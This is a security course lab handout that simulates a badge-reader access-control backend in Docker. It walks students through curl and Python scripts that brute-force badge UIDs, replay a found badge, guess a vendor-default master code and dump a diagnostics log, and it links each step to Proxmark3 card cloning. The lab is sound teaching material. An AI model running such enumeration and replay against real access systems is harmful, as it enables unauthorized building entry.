# Week 11: Bypassing Physical Access Lab

## Overview

> **Read this first - the honest framing.** The contract for this course marks
> *RFID simulation* as **future** work. Genuine RFID/NFC cloning requires
> physical radio hardware - a **Proxmark3**, **Flipper Zero**, ACR122U, or
> TMD-5S reader - plus real 125 kHz cards and MIFARE tags. **None of that can
> run inside a Docker container.** Rather than hand-wave, this lab builds a
> **pure-software simulation of the building access-control *backend***: a tiny
> "badge reader" HTTP service that exposes the same *logic* a real door
> controller uses. Every technique you practice here - **enumerating badge
> UIDs, replaying/cloning a captured badge, finding a vendor-default master
> UID, and dumping credentials off a compromised reader** - maps one-to-one onto
> what an attacker does with a Proxmark3 against a real deployment. You will
> learn the *thinking*; the hardware is just the delivery mechanism.

This lab runs entirely in an isolated Docker bridge network (`172.26.0.0/24`)
with two containers: an **access-control** "reader" service and a **Kali
attacker** workstation.

## Learning Objectives

- **Fingerprint** a deployed access-control device and read what it leaks.
- **Enumerate** badge UIDs by brute-forcing a small identifier space.
- **Replay / clone** a discovered badge (the software analog of copying a
  125 kHz card to a blank).
- **Exploit vendor-default credentials** - a hidden "maintenance master" UID
  shipped in firmware and never changed at install.
- **Dump credentials from a compromised reader** once you are "inside."
- Understand the **physical-security concepts** behind each step: tailgating,
  shoulder surfing, lock/credential types, 125 kHz vs MIFARE, and why
  **default/vendor credentials** are a perennial weakness.

## Physical-security background (read before the activities)

| Concept | What it means | Relevance here |
|---------|---------------|----------------|
| **Tailgating / piggybacking** | Following an authorised person through a door before it closes; piggybacking = with their (reluctant) consent. | A social bypass of the reader entirely - no badge needed. |
| **Shoulder surfing** | Watching someone tap a badge / type a code, or reading it from afar. | How an attacker first learns the badge *format* to enumerate. |
| **Lock types** | Mechanical key, PIN keypad, mag-stripe, RFID/NFC, biometric, multi-factor. | RFID readers are one rung on this ladder - and the weakest if cloning is easy. |
| **125 kHz (prox)** | Legacy low-frequency cards (HID Prox, EM410x). UID broadcast **in the clear** every tap, trivially **cloned** to a blank. | The "replay" activity mirrors cloning one of these. |
| **MIFARE (13.56 MHz)** | High-frequency, has crypto. **Classic** is broken (Cyrus/keys cracked); **DESFire/EV2** are far harder to clone. | Why defenders move to DESFire - and why the worksheet asks about it. |
| **Cloning / replay** | Capturing a card's UID and retransmitting it (replay) or writing it to a writable blank (clone). | Activities (c) and (d). |
| **Default / vendor credentials** | Devices ship with a master/service code (e.g. a factory HID, a known MIFARE key, a debug port). Forgotten at install. | Activity (d) - the hidden `DEAD:BE:EF` master. |

## Setup

1. Build the shared base: `make build-base` (from the repo root).
2. Start the lab:
   ```bash
   cd labs/week11
   docker compose up -d
   ```
3. Enter the attacker workstation:
   ```bash
   docker exec -it week11-attacker bash
   ```
   The simulated reader is at `http://172.26.0.10` (also reachable from your
   host at `http://localhost:11180`). `curl` and `python3` are already in the
   base image - no extra installs needed.

## Activities

All commands run **inside the attacker container** unless noted. Replace
`172.26.0.10` with `localhost:11180` if you prefer to test from your host.

### (a) Fingerprint the reader (5 min)
```bash
curl http://172.26.0.10/status
```
Read the response: it leaks the vendor, model, firmware, the **badge UID
format**, and how many badges are enrolled. That format string is exactly what
shoulder-surfing a real badge gives you - it tells you the *shape* of the
identifier space to brute-force.

### (b) Enumerate badge UIDs to find a valid one (10 min)
The format is `FACILITY:SUBSYS:ID` in hex. Walk the small `04A2:1B:XX` space
and watch for HTTP `200`:
```bash
for i in $(seq 0 255); do
  h=$(printf "%02X" $i)
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://172.26.0.10/present?uid=04A2:1B:$h")
  [ "$code" = "200" ] && echo "VALID BADGE FOUND: 04A2:1B:$h"
done
```
Or the same thing in Python:
```bash
python3 - <<'PY'
import urllib.request, urllib.parse
for i in range(256):
    uid = "04A2:1B:%02X" % i
    url = "http://172.26.0.10/present?" + urllib.parse.urlencode({"uid": uid})
    req = urllib.request.Request(url, method="POST")
    with urllib.request.urlopen(req) as r:
        if r.status == 200:
            print("VALID BADGE FOUND:", uid); break
PY
```
You should find **one** valid employee badge. In the real world this is the
Proxmark3 " bruteforce known facility code" workflow.

### (c) Replay the discovered badge (2 min)
"Cloning" = replay the UID you just captured:
```bash
curl -X POST "http://172.26.0.10/present?uid=<UID-YOU-FOUND>"
# e.g. curl -X POST "http://172.26.0.10/present?uid=04A2:1B:2F"
```
You should get `200 GRANTED` - the door "unlocks." On hardware, this is writing
that UID to a blank T5577/MIFARE Ultralight card with a Proxmark3.

### (d) Find the vendor-default backdoor UID (10 min)
Real controllers often ship with a **maintenance master** code, documented in
the vendor manual and never rotated. Try well-known "default/hex" patterns:
```bash
for guess in DEAD:BE:EF FF:FF:FF 00:00:00 AA:BB:CC DEAD:BEEF FFFF:FFFF; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://172.26.0.10/present?uid=$guess")
  echo "$guess -> $code"
done
```
One of them grants access with a distinctive **maintenance master** message.
Record it - that is the vendor-default credential risk.

### (e) "Inside" - dump credentials from the compromised reader (10 min)
Once you hold a valid badge, the reader exposes a hidden **diagnostics** port
that dumps its access log - the software analog of pulling stored badge UIDs
off a physically compromised reader's debug/serial service:
```bash
curl "http://172.26.0.10/diag?uid=<UID-YOU-FOUND>"
```
The log contains taps by badges you **never enumerated** (different subsystem
code). Those UIDs are reusable credentials you can replay against the same or
another door - lateral movement, badge edition.

> Try `diag` with the vendor master from (d) too - the backdoor opens the same
> diagnostics port.

## Cleanup

```bash
docker compose down
```

**Ethics**: Educational use only, inside this isolated Docker network. Physical
and RFID attacks against real buildings, badges, or readers require **explicit
written authorization and frequently an on-site escort** - cloning a stranger's
badge or tailgating into a building you don't own is a crime. Practice the
thinking here, get a signed scope before touching anything real.

Generated with Claude Code.
